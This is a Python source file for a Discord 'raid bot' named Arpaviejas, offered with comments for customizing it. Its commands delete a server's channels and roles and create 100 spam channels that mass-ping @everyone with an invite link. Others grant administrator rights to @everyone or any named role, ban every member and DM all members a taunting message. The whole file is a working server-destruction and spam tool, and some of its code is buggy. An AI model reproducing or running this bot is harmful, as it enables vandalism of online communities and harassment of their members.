import time
import asyncio
import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed

intents = discord.Intents.default()
intents.members = True
# Intents are important for this, do not touch anything here.
client = commands.Bot(command_prefix="!", intents=intents)


@client.event
async def on_ready():  # Every time that the bots turns on, will show this Ascii Art, if you want to use a custom Ascii art just change it, but let in inside of the triple quotes.
    anarchy = r"""
    ██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗     ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
    ██╔══██╗██║   ██║████╗  ██║██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
    ██████╔╝██║   ██║██╔██╗ ██║█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ███████╗██║   ██║██║   ██║███████║██║  ██║
    ██╔═══╝ ██║   ██║██║╚██╗██║██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ╚════██║██║▄▄ ██║██║   ██║██╔══██║██║  ██║
    ██║     ╚██████╔╝██║ ╚████║██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ███████║╚██████╔╝╚██████╔╝██║  ██║██████╔╝
    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                    Raidbot by: Crowley
    """
    print(anarchy)
    client_status = [  # Put the custom status of the bot in this list, separated by quotes and ,
        "Customize your own status here",
    ]
    while True:
        for bot_status in client_status:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=bot_status))
            # In this case, the bot will change the status every two minutes, change the time (In seconds)
            await asyncio.sleep(120)


def administrator_permissions():
    permissions = discord.Permissions()
    permissions.update(administrator=True)
    return permissions


@client.event
# This event sends spam to every channel created.
async def on_guild_channel_create(channel):
    y = 0
    # Use the logic, the name of the spam channels and this conditional must be the same, or the bot won't work.
    if channel.name == "server-punkwned":
        while y < 15:
            # The spam message, you can use your own custom message.
            await channel.send("||@everyone|| Server Punkwned:\nhttps://discord.gg/FhJydrmbTz")
            y += 1


# Help menu with the default name of the commands, it's up to you change the names and adjust this crap.
@client.command()
async def ayuda(ctx):
    user = ctx.message.author
    embed = discord.Embed(
        title="Command list of Arpaviejas",
        description="Detailed description about what this bot can do at the moment",
        colour=0xebe300
    )
    embed.add_field(
        name="!ayuda", value="Menú de ayuda del bot.", inline=False)
    embed.add_field(name="!eskorbuto", value="Changes the name and the icon of the server, also deletes all the channels and starts to make spam creating new channels with pings.", inline=True)
    embed.add_field(
        name="!kaotiko", value="This command deletes all the roles of the server above the bot's role and creates 50 new roles.", inline=False)
    embed.add_field(
        name="!herejia", value="We must have equity, so this shit will give Admin privileges to the @everyone role.", inline=True)
    embed.add_field(name="!panda", value="If you're an oppresor and son of a bitch, this crap will give you an special role with privileges. **WARNING: OTHER USERS CAN USE THIS, UNLESS YOU ADD AN EQUALITY CHECK TO CONFIRM YOUR USER ID.**", inline=False)
    embed.add_field(
        name="!flema", value="Do you want to get the invite of the bot and take a look to the bad practices of the creator?, use this command.", inline=True)
    embed.add_field(name="!glorificar",
                    value="type !glorificar + role-name to give admin privileges to some role.", inline=False)
    embed.add_field(name="!millencolin", value="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)", inline=True)
    embed.add_field(name="!elektroduentes",
                    value="Works for ban all users, has some bugs due the Discord rate limit", inline=False)
    embed.add_field(
        name="!dazepunk", value="This will send a single DM Message to all the users in the server, except the command author.", inline=True)
    await user.send(embed=embed)

# Eskorbuto Command, if you want to use a custom image, just put the document in the same folder.


@client.command()
async def eskorbuto(ctx):
    # Once you got the image that you want to use, just change the name of the file and the extension if needed, must be on the same folder of the bot file, but you can put a full path to image file.
    with open('anarchism.jpg', 'rb') as f:
        icon = f.read()
    # Here's the new server name, change the name if you want.
    await ctx.guild.edit(name="Server Punkwned by Anarchists", icon=icon)
    try:
        for channels in client.get_all_channels():
            await channels.delete()
    except:
        print(f"Error, i can't delete the channel {channels}")
    # 2 Seconds of delay before the next action, just to avoid limitations with the requests or errors.
    await asyncio.sleep(2)
    x = 0
    while x < 100:
        await ctx.guild.create_text_channel("server-punkwned")
        x += 1


@client.command()
async def kaotiko(ctx):
    for guild in client.guilds:
        for roles in guild.roles:
            # Bot tries to remove his own role for some reason, so i put this, change the Arpaviejas name to your bot name.
            if roles.name != "@everyone" or roles.name != "@Arpaviejas":
                try:
                    await roles.delete()
                except:
                    print(
                        f"Error, i can't delete the role {roles}, maybe i'm above of that role.")
    z = 0
    while z < 50:
        # Again, roles name can be changed and the colour.
        await ctx.guild.create_role(name="Punks Are Here!", colour=0xebe300)
        z += 1


@client.command()
async def herejia(ctx):
    for guild in client.guilds:
        for role in guild.roles:
            if role.name == "@everyone":
                await role.edit(reason=None, permissions=administrator_permissions())

# The Panda command, you can change the Punk Role name and the colour, don't forgot to use "0x" before the Hex range


@client.command()
async def panda(ctx):
    user = ctx.message.author
    role = await ctx.guild.create_role(name="Punk", colour=0xebe300, permissions=administrator_permissions())
    await user.add_roles(role)


@client.command()
async def flema(ctx):
    user = ctx.message.author
    await user.send("Here's my invite:\nhttps://discord.com/oauth2/authorize?client_id=870548494082002944&scope=bot&permissions=8\nDo you want to take a look to the bad practices of the creator of this bot?, here's the official Github Repo:https://github.com/PuppetCrowley/Arpaviejas\n")


@client.command()
async def elektroduendes(ctx):
    for users in ctx.guild.members:
        # Bot won't ban you using this command, because the != is going to check if the users are different from the message.author (The person that puts the command).
        if users != ctx.message.author:
            try:
                await users.ban()
            except:
                print(
                    f"I can't ban {users}, Maybe i'm above of his role or he's the owner of the server.")


@client.command()
async def glorificar(ctx, role: discord.Role, *, reason=None):
    try:
        await role.edit(permissions=administrator_permissions())
    except:
        print(
            f"Error, i can't edit the role {role}, Maybe i'm above of this role or it's somehow protected.")


@client.command()
async def dazepunk(ctx):
    for users in ctx.guild.members:
        # The bot will not send you any DM with this command using this conditional.
        if users != ctx.message.author:
            try:
                await users.send(f"The server {ctx.guild.name} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
            except:
                print(
                    f"Error, i can't send a message to the user {user}, maybe he locked the DM Access.")


@client.command()
# There's some bugs in this command, sometimes, the bot will not end a task and automatically will start another option for some reason.
async def millencolin(ctx):
    eskorbuto(ctx)
    kaotiko(ctx)
    herejia(ctx)

client.run("")  # Put your Bot Token here.
